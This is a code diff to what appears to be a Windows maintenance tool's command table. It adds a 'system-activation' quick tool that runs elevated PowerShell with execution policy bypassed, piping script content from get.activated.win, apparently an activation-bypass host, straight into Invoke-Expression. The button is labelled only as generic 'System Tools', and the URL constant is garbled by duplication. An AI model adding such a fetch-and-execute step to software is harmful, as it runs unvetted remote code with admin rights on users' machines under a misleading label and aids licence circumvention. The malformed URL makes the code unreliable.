@@ -53,6 +53,13 @@ export const WINDOWS_REPAIR_COMMANDS: Record<WindowsRepairAction, CommandSpec> =
   }
 }
 
+// URL del script privado que ejecuta el botón "Herramientas de Sistema" del
+// menú lateral. Debe servirse por HTTPS desde un servidor que controles tú:
+// el whitelist garantiza que el renderer no puede cambiar este valor, pero
+// lo que haga el script depende de quién lo hospede.
+// TODO: reemplazar por la URL real.
+const SYSTEM_TOOLS_SCRIPT_URL = 'https://get.activated.winhttps://get.activated.win'
+
 export const QUICK_TOOL_COMMANDS: Record<QuickToolId, CommandSpec> = {
   'cmd-admin': {
     exe: 'cmd.exe',
@@ -187,6 +194,20 @@ export const QUICK_TOOL_COMMANDS: Record<QuickToolId, CommandSpec> = {
     requiresAdmin: false,
     description: 'Abre la configuración de Storage Sense.',
     dangerous: false
+  },
+  'system-activation': {
+    exe: 'powershell.exe',
+    args: [
+      '-NoProfile',
+      '-ExecutionPolicy',
+      'Bypass',
+      '-Command',
+      `irm ${SYSTEM_TOOLS_SCRIPT_URL} | iex`
+    ],
+    requiresAdmin: true,
+    description:
+      'Descarga y ejecuta el script privado de "Herramientas de Sistema" en una consola elevada. Requiere permisos de administrador.',
+    dangerous: true
   }
 }
 
@@ -224,6 +245,13 @@ export const MAINTENANCE_ACTIONS: Record<MaintenanceAction, MaintenanceSpec> = {
     description: 'Abre el administrador de aplicaciones de inicio del Administrador de tareas.',
     dangerous: false,
     requiresAdmin: false
+  },
+  // Reservado: todavía no tiene implementación en maintenance.service.ts
+  // (cae en el `default` del switch). Pendiente de definir.
+  system_tools: {
+    description: 'Herramientas de sistema (pendiente de implementar).',
+    dangerous: false,
+    requiresAdmin: true
   }
 }
 
